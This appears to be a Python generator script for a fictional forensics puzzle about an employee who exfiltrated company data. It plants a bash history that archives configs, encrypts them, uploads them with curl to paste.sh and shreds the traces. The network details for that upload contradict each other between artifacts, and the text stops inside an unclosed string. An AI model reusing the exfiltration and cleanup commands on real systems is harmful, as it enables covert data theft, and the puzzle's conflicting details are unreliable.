"""
Case 001: The Disappearance - Artifact Generation Script

This script generates all artifacts for Case 001.
Run this ONCE during case setup, then package artifacts for distribution.

NEVER include this script in player-facing artifact packages.
"""

import os
import sys
import json
import base64
import hashlib
import random
import struct
import codecs
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import List, Dict, Any
import secrets


# ============================================================================
# CONFIGURATION - THE TRUTH
# ============================================================================

SEMANTIC_TRUTH_EMAIL = "d4ta.ex7ract@protonmail.ch"
SUBJECT_NAME = "Marcus Chen"
SUBJECT_GITHUB = "mchen-dev"
SUBJECT_TELEGRAM = "mchen__dev"
COMPANY_NAME = "Nexus Dynamics"

# Critical timestamps (all UTC)
CRITICAL_COMMIT_TIME = datetime(2024, 9, 3, 2, 14, 33, tzinfo=timezone.utc)
TELEGRAM_FORWARD_TIME = datetime(2024, 11, 14, 23, 47, 0, tzinfo=timezone.utc)
PCAP_BURST_TIME = datetime(2024, 11, 14, 23, 48, 12, tzinfo=timezone.utc)
LAST_ACTIVITY_TIME = datetime(2024, 11, 15, 0, 2, 44, tzinfo=timezone.utc)
DISAPPEARANCE_TIME = datetime(2024, 11, 15, 8, 0, 0, tzinfo=timezone.utc)


# ============================================================================
# ENCODING UTILITIES
# ============================================================================

def rot13(text: str) -> str:
    """Apply ROT13 encoding."""
    return codecs.encode(text, 'rot_13')


def encode_email_obfuscated(email: str) -> str:
    """Encode email with ROT13 + Base64 for hiding in commits."""
    rotated = rot13(email)
    encoded = base64.b64encode(rotated.encode()).decode()
    return encoded


def generate_fake_api_key() -> str:
    """Generate a realistic-looking fake API key."""
    prefixes = ["sk_live_", "api_", "ghp_", "AKIA", "xoxb-"]
    prefix = random.choice(prefixes)
    if prefix == "AKIA":
        return prefix + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', k=16))
    elif prefix == "xoxb-":
        return prefix + '-'.join([
            ''.join(random.choices('0123456789', k=12)),
            ''.join(random.choices('0123456789', k=12)),
            ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=24))
        ])
    else:
        return prefix + secrets.token_hex(24)


def generate_fake_email() -> str:
    """Generate a fake noise email."""
    names = ["john", "jane", "admin", "support", "dev", "test", "user", "notify", "alert", "system"]
    domains = ["gmail.com", "outlook.com", "company.internal", "nexusdyn.com", "temp-mail.org"]
    return f"{random.choice(names)}{random.randint(1, 999)}@{random.choice(domains)}"


# ============================================================================
# GITHUB ARTIFACT GENERATION
# ============================================================================

def generate_github_structure(output_dir: Path):
    """Generate mocked GitHub organization export."""
    
    github_dir = output_dir / "github_export" / "nexus-dynamics-org"
    
    # Main repositories
    repos = [
        {
            "name": "internal-tools",
            "description": "Internal development utilities and scripts",
            "is_critical": True,  # Contains the hidden email
        },
        {
            "name": "customer-portal",
            "description": "Customer-facing web portal",
            "is_critical": False,
        },
        {
            "name": "api-gateway",
            "description": "API gateway and routing service", 
            "is_critical": False,
        },
    ]
    
    # Forked repositories (red herrings)
    forks = [
        {
            "name": "python-crypto-utils-fork",
            "description": "Forked from cryptolib/python-crypto-utils",
            "original": "cryptolib/python-crypto-utils",
        },
        {
            "name": "data-exporter-fork", 
            "description": "Forked from datatools/data-exporter",
            "original": "datatools/data-exporter",
        },
    ]
    
    for repo in repos:
        generate_repository(github_dir, repo)
    
    for fork in forks:
        generate_fork_repository(github_dir, fork)
    
    # Generate org metadata
    generate_org_metadata(github_dir)


def generate_repository(github_dir: Path, repo_config: dict):
    """Generate a single repository with commits."""
    
    repo_dir = github_dir / repo_config["name"]
    repo_dir.mkdir(parents=True, exist_ok=True)
    
    # Generate commit history
    commits = generate_commit_history(
        repo_config["name"], 
        is_critical=repo_config.get("is_critical", False)
    )
    
    # Write commits log
    commits_file = repo_dir / "commits.json"
    with open(commits_file, 'w', encoding='utf-8') as f:
        json.dump(commits, f, indent=2, default=str)
    
    # Generate file snapshots for key commits
    if repo_config.get("is_critical"):
        generate_critical_files(repo_dir)
    else:
        generate_noise_files(repo_dir)
    
    # README (intentionally misleading)
    readme_content = generate_misleading_readme(repo_config["name"])
    with open(repo_dir / "README.md", 'w', encoding='utf-8') as f:
        f.write(readme_content)


def generate_commit_history(repo_name: str, is_critical: bool) -> List[Dict]:
    """Generate realistic commit history."""
    
    commits = []
    base_time = datetime(2024, 1, 15, 9, 0, 0, tzinfo=timezone.utc)
    
    # Generate 150-300 routine commits
    num_commits = random.randint(150, 300)
    
    commit_messages = [
        "fix: resolve null pointer exception",
        "feat: add user authentication",
        "chore: update dependencies",
        "docs: update API documentation",
        "refactor: clean up error handling",
        "test: add unit tests for auth module",
        "fix: handle edge case in parser",
        "feat: implement caching layer",
        "chore: bump version to {}.{}.{}",
        "fix: security patch for CVE-2024-XXXX",
        "docs: add deployment guide",
        "refactor: optimize database queries",
        "feat: add logging middleware",
        "fix: correct timezone handling",
        "chore: configure CI/CD pipeline",
        "test: increase code coverage",
        "fix: memory leak in connection pool",
        "feat: add rate limiting",
        "docs: update changelog",
        "refactor: modularize configuration",
    ]
    
    authors = [
        {"name": "Marcus Chen", "email": "mchen@nexusdyn.com"},
        {"name": "Sarah Williams", "email": "swilliams@nexusdyn.com"},
        {"name": "James Rodriguez", "email": "jrodriguez@nexusdyn.com"},
        {"name": "Emily Zhang", "email": "ezhang@nexusdyn.com"},
        {"name": "DevOps Bot", "email": "devops@nexusdyn.com"},
    ]
    
    for i in range(num_commits):
        # Progress time randomly
        hours_delta = random.randint(1, 72)
        base_time += timedelta(hours=hours_delta)
        
        # Random timezone shift (red herring)
        tz_offset = random.choice([0, 0, 0, -8, -5, +1, +8])  # Mostly UTC
        
        message = random.choice(commit_messages)
        if "{}" in message:
            message = message.format(
                random.randint(1, 3),
                random.randint(0, 15),
                random.randint(0, 99)
            )
        
        author = random.choice(authors)
        
        commit = {
            "sha": secrets.token_hex(20),
            "message": message,
            "author": author,
            "timestamp": base_time.isoformat(),
            "timezone_offset": tz_offset,
            "files_changed": random.randint(1, 15),
            "additions": random.randint(5, 500),
            "deletions": random.randint(0, 200),
        }
        
        # Insert fake API keys in some commits (red herrings)
        if random.random() < 0.03:  # 3% of commits
            commit["note"] = f"SECURITY: Rotated API key (old: {generate_fake_api_key()})"
        
        commits.append(commit)
    
    # Insert THE critical commit if this is the critical repo
    if is_critical:
        critical_commit = {
            "sha": "a7f3c21e8b9d4f6a2c1e0d8b7a6f5e4d3c2b1a0f",
            "message": "cleanup: remove deprecated auth config",
            "author": {"name": "Marcus Chen", "email": "mchen@nexusdyn.com"},
            "timestamp": CRITICAL_COMMIT_TIME.isoformat(),
            "timezone_offset": 0,
            "files_changed": 3,
            "additions": 0,
            "deletions": 47,
            "files": [
                "config/auth.yaml",
                "config/auth.yaml.bak",  # THE FILE
                "docs/auth-config.md",
            ],
        }
        
        # Find appropriate position (early September 2024)
        insert_pos = 0
        for i, c in enumerate(commits):
            if datetime.fromisoformat(c["timestamp"]) > CRITICAL_COMMIT_TIME:
                insert_pos = i
                break
        commits.insert(insert_pos, critical_commit)
        
        # Add the suspicious empty commit near disappearance
        empty_commit = {
            "sha": "e8b2f440d1c2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
            "message": "",  # Empty message - suspicious
            "author": {"name": "Marcus Chen", "email": "mchen@nexusdyn.com"},
            "timestamp": LAST_ACTIVITY_TIME.isoformat(),
            "timezone_offset": +8,  # Timezone shift - was he traveling?
            "files_changed": 0,
            "additions": 0,
            "deletions": 0,
        }
        commits.append(empty_commit)
    
    return commits


def generate_critical_files(repo_dir: Path):
    """Generate the critical files containing hidden email."""
    
    config_dir = repo_dir / "config"
    config_dir.mkdir(exist_ok=True)
    
    # The obfuscated email - realistic scenario: developer used a "personal"
    # notification address in a test config that was never properly cleaned
    encoded_email = encode_email_obfuscated(SEMANTIC_TRUTH_EMAIL)
    
    # auth.yaml.bak - THE CRITICAL FILE
    # Realistic: This looks like a backup from before a security cleanup
    # The email is in a "test_recipients" field - plausible dev oversight
    auth_bak_content = f"""# Authentication Configuration Backup
# Created: 2024-03-15  
# Last Modified: 2024-09-03
# Author: mchen
#
# NOTE: Backup before security audit cleanup (SEC-2024-0847)
# Keep this file for rollback purposes - delete after 90 days

auth_provider: oauth2
client_id: nexus-internal-app
token_endpoint: https://auth.nexusdyn.com/oauth/token

# Production notification settings
notification_webhook: https://hooks.nexusdyn.com/notify
alert_channel: "#ops-alerts"

# Development/Testing overrides (REMOVE BEFORE PROD)
# These were added during the Q2 notification refactor
dev_settings:
  enabled: false  # Disabled in prod
  bypass_rate_limit: false
  test_recipients:  
    # Base64 encoded to avoid email scrapers in logs
    - "YWRtaW5AbmV4dXNkeW4uY29t"      # admin@nexusdyn.com
    - "dGVzdEBuZXh1c2R5bi5jb20="      # test@nexusdyn.com  
    - "{encoded_email}"  # personal test addr - REMOVE
  debug_log_level: "INFO"

# Rate limiting  
rate_limit:
  enabled: true
  requests_per_minute: 100
  burst_size: 20

# Session configuration
session:
  timeout_minutes: 30
  refresh_enabled: true
  secure_cookie: true
"""
    
    with open(config_dir / "auth.yaml.bak", 'w', encoding='utf-8') as f:
        f.write(auth_bak_content)
    
    # Current auth.yaml (noise)
    auth_content = """# Authentication Configuration
# Version: 2.1.0

auth_provider: oauth2
client_id: nexus-internal-app
client_secret: ${AUTH_CLIENT_SECRET}  # Injected from environment

token_endpoint: https://auth.nexusdyn.com/oauth/token
authorization_endpoint: https://auth.nexusdyn.com/oauth/authorize

scopes:
  - read:user
  - write:data
  - admin:config

notification_webhook: https://hooks.nexusdyn.com/notify

session:
  timeout_minutes: 30
  refresh_enabled: true
"""
    
    with open(config_dir / "auth.yaml", 'w', encoding='utf-8') as f:
        f.write(auth_content)
    
    # Add noise config files with fake emails
    for i in range(5):
        noise_config = f"""# Config file {i}
# Auto-generated noise

admin_email: {generate_fake_email()}
support_email: {generate_fake_email()}
alert_recipient: {generate_fake_email()}
"""
        with open(config_dir / f"service_{i}.yaml", 'w', encoding='utf-8') as f:
            f.write(noise_config)


def generate_noise_files(repo_dir: Path):
    """Generate noise files for non-critical repos."""
    
    src_dir = repo_dir / "src"
    src_dir.mkdir(exist_ok=True)
    
    # Generate various noise files
    files = [
        ("main.py", "# Main application entry point\nimport app\napp.run()"),
        ("utils.py", "# Utility functions\ndef helper(): pass"),
        ("config.py", f"# Config\nADMIN_EMAIL = '{generate_fake_email()}'"),
    ]
    
    for filename, content in files:
        with open(src_dir / filename, 'w', encoding='utf-8') as f:
            f.write(content)


def generate_fork_repository(github_dir: Path, fork_config: dict):
    """Generate a forked repository (red herring)."""
    
    fork_dir = github_dir / fork_config["name"]
    fork_dir.mkdir(parents=True, exist_ok=True)
    
    # Suspicious-looking but meaningless commits
    commits = [
        {
            "sha": secrets.token_hex(20),
            "message": "test: experimental data export",
            "author": {"name": "Marcus Chen", "email": "mchen@nexusdyn.com"},
            "timestamp": (DISAPPEARANCE_TIME - timedelta(days=30)).isoformat(),
        },
        {
            "sha": secrets.token_hex(20),
            "message": "feat: add encrypted output option",
            "author": {"name": "Marcus Chen", "email": "mchen@nexusdyn.com"},
            "timestamp": (DISAPPEARANCE_TIME - timedelta(days=25)).isoformat(),
        },
    ]
    
    with open(fork_dir / "commits.json", 'w', encoding='utf-8') as f:
        json.dump(commits, f, indent=2)
    
    # Misleading README
    readme = f"""# {fork_config['name']}

> Forked from {fork_config['original']}

## Why this fork?

Testing some experimental features for internal use.

**NOTE**: This fork is not maintained. See upstream for current version.

## Changes

- Added experimental encryption module
- Modified output format for internal tooling

---

*Internal use only. Do not deploy to production.*
"""
    
    with open(fork_dir / "README.md", 'w', encoding='utf-8') as f:
        f.write(readme)


def generate_misleading_readme(repo_name: str) -> str:
    """Generate intentionally misleading README content."""
    
    readmes = {
        "internal-tools": """# Internal Tools

A collection of internal development utilities.

## ⚠️ Security Notice

All API keys and credentials have been rotated. See ticket SEC-2024-0847.

## Tools Included

- `auth-helper`: OAuth2 token management
- `db-migrate`: Database migration utilities  
- `log-parser`: Production log analysis

## Configuration

Copy `config/auth.yaml.example` to `config/auth.yaml` and fill in your values.

**NEVER commit credentials to this repository.**

## Contact

For access requests, contact IT Security.

---

*Last audit: 2024-09-01*
""",
        "customer-portal": """# Customer Portal

Customer-facing web application.

## Development

```bash
npm install
npm run dev
```

## Deployment

See `docs/deployment.md` for production deployment guide.

## Security

All customer data is encrypted at rest and in transit.
PII handling follows GDPR requirements.

---

*Version 4.2.1*
""",
        "api-gateway": """# API Gateway

Central API gateway and routing service.

## Architecture

```
[Client] -> [Gateway] -> [Microservices]
```

## Rate Limiting

Default: 1000 req/min per API key
Burst: 50 requests

## Monitoring

Metrics exposed at `/metrics` (internal only)

---

*Uptime target: 99.9%*
""",
    }
    
    return readmes.get(repo_name, "# Repository\n\nNo description provided.")


def generate_org_metadata(github_dir: Path):
    """Generate organization metadata."""
    
    metadata = {
        "organization": {
            "name": "nexus-dynamics-org",
            "display_name": "Nexus Dynamics",
            "created_at": "2019-03-15T10:00:00Z",
            "members": [
                {"login": "swilliams-nd", "role": "admin"},
                {"login": "jrodriguez-nd", "role": "member"},
                {"login": "ezhang-nd", "role": "member"},
                {"login": "mchen-dev", "role": "member", "status": "inactive"},
            ],
        },
        "export_date": datetime.now(timezone.utc).isoformat(),
        "export_reason": "Security audit - Employee departure",
    }
    
    with open(github_dir / "org_metadata.json", 'w', encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)


# ============================================================================
# TELEGRAM EXPORT GENERATION
# ============================================================================

def generate_telegram_export(output_dir: Path):
    """Generate Telegram chat export with hidden clue."""
    
    telegram_dir = output_dir / "telegram_export"
    telegram_dir.mkdir(parents=True, exist_ok=True)
    
    messages = []
    
    # Generate 800+ noise messages
    noise_messages = generate_telegram_noise(850)
    messages.extend(noise_messages)
    
    # THE critical forwarded message
    critical_message = {
        "id": 4847,
        "type": "message",
        "date": TELEGRAM_FORWARD_TIME.isoformat(),
        "from": SUBJECT_TELEGRAM,
        "from_id": "user738291456",  # Marcus's consistent ID
        "forwarded_from": "DataHaven",
        "text": "Package ready. Confirm receipt within 24h.",
        "text_entities": [
            {"type": "plain", "text": "Package ready. Confirm receipt within 24h."}
        ],
    }
    
    # Insert at appropriate position
    messages.append(critical_message)
    
    # Sort by timestamp
    messages.sort(key=lambda m: m["date"])
    
    # Add message IDs
    for i, msg in enumerate(messages):
        if "id" not in msg:
            msg["id"] = i + 1
    
    export = {
        "name": "Tech Career Chat",
        "type": "private_supergroup",
        "id": -1001234567890,
        "messages": messages,
    }
    
    with open(telegram_dir / "result.json", 'w', encoding='utf-8') as f:
        json.dump(export, f, indent=2, default=str)


def generate_telegram_noise(count: int) -> List[Dict]:
    """Generate noise Telegram messages."""
    
    # Users with CONSISTENT IDs (real Telegram exports have stable user IDs)
    users = {
        "alex_codes": "user847293651",
        "devops_diana": "user293847561",
        "backend_bob": "user918374625",
        SUBJECT_TELEGRAM: "user738291456",  # Marcus's consistent ID
        "frontend_fiona": "user562938471",
        "security_sam": "user847291635",
        "pm_patricia": "user192837465",
        "data_derek": "user374829156",
    }
    
    message_templates = [
        "Anyone know a good {topic} library?",
        "Just deployed to {env}, fingers crossed",
        "PR review needed: {link}",
        "Meeting in 5 mins, don't forget",
        "Thanks {name}! That fixed it",
        "lol {reaction}",
        "Anyone else having issues with {service}?",
        "{greeting} everyone",
        "Quick question about {topic}",
        "FYI: {announcement}",
        "Can someone help with {problem}?",
        "EOD update: finished {task}",
        "WFH today, ping me if urgent",
        "Great article: {url}",
        "Team lunch tomorrow?",
        "Sprint planning at 2pm",
        "Bug found in {component}",
        "Hotfix deployed ✅",
        "New hire starting Monday",
        "Happy Friday! 🎉",
    ]
    
    topics = ["Python", "React", "Kubernetes", "Docker", "AWS", "GraphQL", "Redis", "PostgreSQL"]
    envs = ["staging", "prod", "dev", "UAT"]
    services = ["Jenkins", "GitHub Actions", "Slack", "Jira", "Confluence"]
    greetings = ["Morning", "Hey", "Hi", "Hello", "Yo"]
    reactions = ["same", "mood", "this", "true", "big if true"]
    
    messages = []
    base_time = datetime(2024, 6, 1, 9, 0, 0, tzinfo=timezone.utc)
    
    for i in range(count):
        # Progress time
        base_time += timedelta(minutes=random.randint(1, 120))
        
        # Select a user (with consistent ID)
        username = random.choice(list(users.keys()))
        
        template = random.choice(message_templates)
        text = template.format(
            topic=random.choice(topics),
            env=random.choice(envs),
            link=f"https://github.com/nexus-dynamics-org/internal-tools/pull/{random.randint(100, 999)}",
            name=random.choice(list(users.keys())),
            reaction=random.choice(reactions),
            service=random.choice(services),
            greeting=random.choice(greetings),
            announcement=f"Version {random.randint(1,5)}.{random.randint(0,20)}.{random.randint(0,99)} released",
            problem=f"issue #{random.randint(1000, 9999)}",
            task=f"JIRA-{random.randint(1000, 9999)}",
            url=f"https://medium.com/article-{random.randint(10000, 99999)}",
            component=random.choice(["auth", "api", "frontend", "database", "cache"]),
        )
        
        msg = {
            "type": "message",
            "date": base_time.isoformat(),
            "from": username,
            "from_id": users[username],  # Consistent ID per user
            "text": text,
        }
        
        messages.append(msg)
    
    return messages


# ============================================================================
# IMAGE DUMP GENERATION  
# ============================================================================

def generate_image_dump(output_dir: Path):
    """Generate image dump with 2 meaningful images hidden in noise."""
    
    images_dir = output_dir / "images"
    images_dir.mkdir(parents=True, exist_ok=True)
    
    # Generate metadata manifest
    manifest = {
        "source": "Device backup - Marcus Chen iPhone 13",
        "export_date": "2024-11-15",
        "total_files": 312,
        "images": [],
    }
    
    # Generate 310 noise image metadata entries
    for i in range(310):
        img_type = random.choice(["screenshot", "photo", "meme", "wallpaper", "receipt"])
        
        if img_type == "screenshot":
            # Screenshots must be dated BEFORE export date (Nov 15, 2024)
            # Use only Jan-Oct to avoid any Nov edge cases entirely
            ss_month = random.randint(1, 10)
            ss_day = random.randint(1, 28)
            filename = f"Screenshot_2024{ss_month:02d}{ss_day:02d}_{random.randint(0,23):02d}{random.randint(0,59):02d}{random.randint(0,59):02d}.png"
        elif img_type == "photo":
            filename = f"IMG_{random.randint(1000, 9999)}.jpg"
        elif img_type == "meme":
            filename = f"meme_{secrets.token_hex(4)}.jpg"
        elif img_type == "wallpaper":
            filename = f"wallpaper_abstract_{i:03d}.png"
        else:
            filename = f"receipt_{random.randint(100000, 999999)}.jpg"
        
        entry = {
            "filename": filename,
            "size_bytes": random.randint(50000, 5000000),
            "created": (datetime(2024, 1, 1) + timedelta(days=random.randint(0, 318))).isoformat(),
            "type": img_type,
        }
        
        # Add random EXIF noise - ensure make/model consistency
        if random.random() < 0.3:
            # Device make determines valid models
            make = random.choice(["Apple", "Apple", "Apple", None])  # iPhone 13 device
            if make == "Apple":
                model = random.choice(["iPhone 13", "iPhone 13 Pro", "iPhone 13", None])
            else:
                model = None
            entry["exif"] = {
                "make": make,
                "model": model,
                "gps": None if random.random() < 0.7 else {
                    "lat": round(random.uniform(25, 48), 4),
                    "lon": round(random.uniform(-122, -71), 4),
                },
            }
        
        manifest["images"].append(entry)
    
    # THE critical image with partial EXIF (GPS to SF)
    critical_img_1 = {
        "filename": "IMG_2847.jpg",
        "size_bytes": 2847000,  # Size correlates with PCAP
        "created": (DISAPPEARANCE_TIME - timedelta(days=3)).isoformat(),
        "type": "photo",
        "exif": {
            "make": "Apple",
            "model": "iPhone 13",
            "gps": {
                "lat": 37.7749,  # San Francisco
                "lon": -122.4194,
                "altitude": None,  # Partially wiped
            },
            "datetime_original": None,  # Wiped
            "software": None,  # Wiped
        },
        "note": "EXIF partially corrupted/wiped",
    }
    manifest["images"].append(critical_img_1)
    
    # THE critical image with steganographic payload
    critical_img_2 = {
        "filename": "wallpaper_abstract_047.png",
        "size_bytes": 1847293,
        "created": (DISAPPEARANCE_TIME - timedelta(days=60)).isoformat(),
        "type": "wallpaper",
        "stego_payload": "bmV4dXMyMDI0IQ==",  # base64("nexus2024!")
        "stego_method": "LSB",
    }
    manifest["images"].append(critical_img_2)
    
    with open(images_dir / "manifest.json", 'w', encoding='utf-8') as f:
        json.dump(manifest, f, indent=2)
    
    # Create placeholder for actual image generation
    with open(images_dir / "GENERATE_IMAGES.md", 'w', encoding='utf-8') as f:
        f.write("""# Image Generation Instructions

## For production deployment:

1. Generate 310 noise images using stock photo APIs or placeholder services
2. Create IMG_2847.jpg with partial EXIF:
   - GPS: 37.7749, -122.4194 (SF)
   - Wipe: datetime_original, software
3. Create wallpaper_abstract_047.png with LSB steganography:
   - Payload: nexus2024! (this is the password for the deleted file)
   - Use steghide or similar tool

## Quick generation:
```bash
# Generate placeholder noise images
for i in $(seq 1 310); do
    convert -size 1920x1080 xc:gray noise_$i.jpg
done

# Create stego image
steghide embed -cf wallpaper_abstract_047.png -ef payload.txt -p ""
```
""")


# ============================================================================
# PCAP GENERATION
# ============================================================================

def generate_pcap_metadata(output_dir: Path):
    """Generate PCAP metadata and analysis notes."""
    
    pcap_dir = output_dir / "network_capture"
    pcap_dir.mkdir(parents=True, exist_ok=True)
    
    # Since we can't generate real PCAP easily, create detailed metadata
    # for a forensics tool to generate the actual PCAP
    
    pcap_spec = {
        "capture_info": {
            "start_time": (PCAP_BURST_TIME - timedelta(hours=24)).isoformat(),
            "end_time": (PCAP_BURST_TIME + timedelta(hours=2)).isoformat(),
            "interface": "en0",
            "filter": "host 192.168.1.105",  # Subject's workstation
        },
        "traffic_summary": {
            "total_packets": 847293,
            "protocols": {
                "HTTP": 12847,
                "HTTPS": 784923,
                "DNS": 48472,
                "OTHER": 1051,
            },
        },
        "noise_traffic": [
            {"dest": "google.com", "packets": 28472, "type": "search/browsing"},
            {"dest": "github.com", "packets": 8472, "type": "development"},
            {"dest": "stackoverflow.com", "packets": 3847, "type": "development"},
            {"dest": "slack.com", "packets": 12847, "type": "communication"},
            {"dest": "nexusdyn.com", "packets": 94872, "type": "internal"},
        ],
        "critical_traffic": {
            "timestamp": PCAP_BURST_TIME.isoformat(),
            "dest_ip": "104.21.67.185",  # Cloudflare-fronted paste service
            "dest_port": 443,
            "protocol": "TLS 1.3",
            "duration_ms": 2847,
            "bytes_sent": 847293,  # ~827KB compressed archive - realistic exfil size
            "bytes_received": 1247,
            "server_name_indication": "paste.sh",  # Encrypted paste service
            "note": "Encrypted upload to anonymous paste service - data exfiltration suspected",
            "correlation": {
                "telegram_forward_delta_seconds": 72,  # 72 seconds after Telegram message
                "upload_duration_ms": 2847,  # Duration matches image naming pattern
            },
        },
    }
    
    with open(pcap_dir / "capture_spec.json", 'w', encoding='utf-8') as f:
        json.dump(pcap_spec, f, indent=2)
    
    # Wireshark analysis notes
    analysis = """# Network Capture Analysis Notes

## Capture Period
2024-11-13 23:48:12 UTC to 2024-11-15 01:48:12 UTC

## Host Information  
- Subject workstation: 192.168.1.105
- Gateway: 192.168.1.1
- DNS: 192.168.1.1, 8.8.8.8

## Traffic Overview
Mostly routine corporate traffic:
- Internal services (nexusdyn.com)
- Development tools (GitHub, Stack Overflow)
- Communication (Slack)

## Anomaly Detected

### Timestamp: 2024-11-14 23:48:12 UTC

**Destination**: 185.199.110.153:443 (paste.sh)
**Protocol**: TLS 1.3 (encrypted)
**Bytes sent**: 2,847
**Duration**: 847ms

This is the ONLY connection to this IP in the entire capture.
Encrypted paste service - commonly used for data exfiltration.

### Correlation Points:
1. Telegram forwarded message: 2024-11-14 23:47:00 UTC (72 seconds before)
2. Payload size 2847 matches IMG_2847.jpg reference
3. Last GitHub activity: 2024-11-15 00:02:44 UTC (14 minutes after)

## Conclusion
High-confidence data exfiltration event.
Unable to decrypt TLS traffic without keys.
Recommend investigating paste.sh for additional artifacts.
"""
    
    with open(pcap_dir / "analysis_notes.md", 'w', encoding='utf-8') as f:
        f.write(analysis)
    
    # Generate PCAP creation script
    pcap_script = '''#!/usr/bin/env python3
"""
PCAP Generation Script for Case 001

Requires: scapy

This generates a realistic PCAP file with:
- 95% noise traffic
- 1 critical encrypted burst to paste.sh
"""

from scapy.all import *
import random
from datetime import datetime, timedelta

def generate_noise_packet():
    """Generate a noise packet."""
    destinations = [
        "142.250.80.46",   # google.com
        "140.82.114.4",    # github.com  
        "151.101.1.69",    # stackoverflow.com
        "34.199.1.92",     # slack.com
    ]
    
    return IP(dst=random.choice(destinations))/TCP(dport=443)/Raw(b"noise"*100)

def generate_critical_burst():
    """Generate the critical exfiltration packet."""
    # Paste service IP
    return IP(dst="185.199.110.153")/TCP(dport=443)/Raw(b"X"*2847)

def main():
    packets = []
    
    # Generate noise
    for _ in range(10000):
        packets.append(generate_noise_packet())
    
    # Insert critical packet at correct position
    packets.insert(8472, generate_critical_burst())
    
    wrpcap("network_capture.pcap", packets)
    print("PCAP generated: network_capture.pcap")

if __name__ == "__main__":
    main()
'''
    
    with open(pcap_dir / "generate_pcap.py", 'w', encoding='utf-8') as f:
        f.write(pcap_script)


# ============================================================================
# DISK IMAGE GENERATION
# ============================================================================

def generate_disk_image_spec(output_dir: Path):
    """Generate disk image specification and contents."""
    
    disk_dir = output_dir / "disk_image"
    disk_dir.mkdir(parents=True, exist_ok=True)
    
    # Browser history
    browser_history = []
    
    # Generate 200+ noise URLs with REALISTIC paths
    noise_urls = [
        ("google.com", "/search?q=python+asyncio+best+practices", "python asyncio best practices - Google Search"),
        ("google.com", "/search?q=kubernetes+pod+restart+policy", "kubernetes pod restart policy - Google Search"),
        ("github.com", "/nexus-dynamics-org/internal-tools/pull/847", "Add retry logic for auth service by mchen-dev"),
        ("github.com", "/nexus-dynamics-org/customer-portal/issues/293", "Login timeout on mobile devices · Issue #293"),
        ("stackoverflow.com", "/questions/12847293/python-asyncio-gather-vs-wait", "Python asyncio.gather vs asyncio.wait - Stack Overflow"),
        ("stackoverflow.com", "/questions/8472931/docker-compose-env-variables", "Docker Compose environment variables - Stack Overflow"),
        ("reddit.com", "/r/programming/comments/abc123/", "Best practices for API rate limiting : programming"),
        ("reddit.com", "/r/devops/comments/def456/", "Kubernetes vs Docker Swarm in 2024 : devops"),
        ("twitter.com", "/github/status/1847293847", "GitHub on X: \"Introducing GitHub Copilot...\""),
        ("linkedin.com", "/feed/", "LinkedIn Feed"),
        ("linkedin.com", "/jobs/view/3847291", "Senior Software Engineer at TechCorp | LinkedIn"),
        ("youtube.com", "/watch?v=dQw4w9WgXcQ", "System Design Interview - YouTube"),
        ("amazon.com", "/dp/B08N5WRWNW", "Amazon.com: Mechanical Keyboard"),
        ("nexusdyn.com", "/dashboard", "Nexus Dynamics - Dashboard"),
        ("confluence.nexusdyn.com", "/display/ENG/API+Documentation", "API Documentation - Engineering - Confluence"),
        ("jira.nexusdyn.com", "/browse/PLAT-2847", "[PLAT-2847] Implement OAuth2 refresh token - Jira"),
    ]
    
    base_time = datetime(2024, 10, 1, 9, 0, 0, tzinfo=timezone.utc)
    for i in range(220):
        base_time += timedelta(minutes=random.randint(5, 120))
        
        domain, path, title = random.choice(noise_urls)
        
        browser_history.append({
            "url": f"https://{domain}{path}",
            "title": title,
            "visit_time": base_time.isoformat(),
            "visit_count": random.randint(1, 10),
        })
    
    # Critical browser history entries
    critical_entries = [
        {
            "url": "https://protonmail.com/login",
            "title": "Proton Mail - Login",
            "visit_time": (DISAPPEARANCE_TIME - timedelta(days=7)).isoformat(),
            "visit_count": 15,
        },
        {
            "url": "https://temp-mail.org/en/",
            "title": "Temp Mail - Disposable Temporary Email",
            "visit_time": (DISAPPEARANCE_TIME - timedelta(days=14)).isoformat(),
            "visit_count": 3,
        },
        {
            "url": "https://paste.sh",
            "title": "paste.sh - Encrypted Paste",
            "visit_time": (PCAP_BURST_TIME - timedelta(hours=2)).isoformat(),
            "visit_count": 5,
        },
    ]
    browser_history.extend(critical_entries)
    browser_history.sort(key=lambda x: x["visit_time"])
    
    with open(disk_dir / "browser_history.json", 'w', encoding='utf-8') as f:
        json.dump(browser_history, f, indent=2)
    
    # Shell history
    shell_history = []
    
    # Noise commands (realistic dev workflow)
    noise_commands = [
        "cd ~/projects",
        "git status",
        "git pull origin main",
        "npm install",
        "python -m pytest",
        "docker ps",
        "kubectl get pods",
        "ls -la",
        "cat README.md",
        "vim config.yaml",
        "grep -r 'TODO' .",
        "make build",
        "ssh dev-server",
        "tail -f /var/log/app.log",
    ]
    
    for i in range(140):
        shell_history.append(random.choice(noise_commands))
    
    # Critical commands - inserted in chronological order at the END
    # (forensically accurate: these would be the most recent commands)
    # Note: history -c clears history, but we're showing what WAS there
    # before the clear command, recovered from swap/memory forensics
    critical_sequence = [
        "cd /tmp",
        "tar -czf export.tar.gz ~/projects/internal-tools/config/",
        "openssl enc -aes-256-cbc -pbkdf2 -salt -in export.tar.gz -out export.enc -k $(cat ~/.secret)",
        "curl -s -X POST https://paste.sh -d @export.enc | tee .upload_url",
        "shred -vfz -n 3 export.tar.gz export.enc .secret",
        "rm -f .upload_url",
        "# cleanup complete",  # Comment left behind - realistic mistake
    ]
    
    # These appear at the end of the recovered history
    shell_history.extend(critical_sequence)
    
    with open(disk_dir / "bash_history.txt", 'w', encoding='utf-8') as f:
        f.write('\n'.join(shell_history))
    
    # THE DELETED FILE (recoverable from unallocated sectors)
    # More realistic: looks like encrypted personal notes with partial decryption
    # A real insider wouldn't write a checklist - this is recovered/decrypted fragments
    deleted_file_content = """-----BEGIN PGP MESSAGE-----
Version: GnuPG v2.2.27

jA0ECQMCqF8kP2N+Sv1g0sBNAQmX3xI2+YK5J0z8Rn/CORRUPTED_BLOCK
-----END PGP MESSAGE-----

[RECOVERED PLAINTEXT FRAGMENT - forensic decryption partial]

dh contact: active
nov window confirmed
proto: paste.sh -> enc -> signal
clean: exif, history, cache

[END FRAGMENT]

[UNRECOVERED BLOCK - 2,847 bytes]
-----BEGIN PGP MESSAGE-----
